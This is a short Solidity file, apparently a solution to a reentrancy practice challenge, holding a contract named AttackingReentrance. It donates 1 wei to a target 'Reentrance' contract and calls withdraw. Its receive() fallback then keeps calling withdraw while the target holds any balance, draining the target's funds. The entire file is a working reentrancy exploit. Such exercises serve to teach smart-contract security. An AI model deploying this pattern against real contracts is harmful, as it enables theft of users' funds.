// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";
import "hardhat/console.sol";

// list different ways you can call a third party contract

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    receive() external payable {
        if(contractAddress.balance > 0) {
            Reentrance(contractAddress).withdraw();
        }
    }

    function hackContract() external {
        // "donate" first to this malicious contract
        Reentrance(contractAddress).donate{value: 1}(address(this));
        Reentrance(contractAddress).withdraw();
    }
}
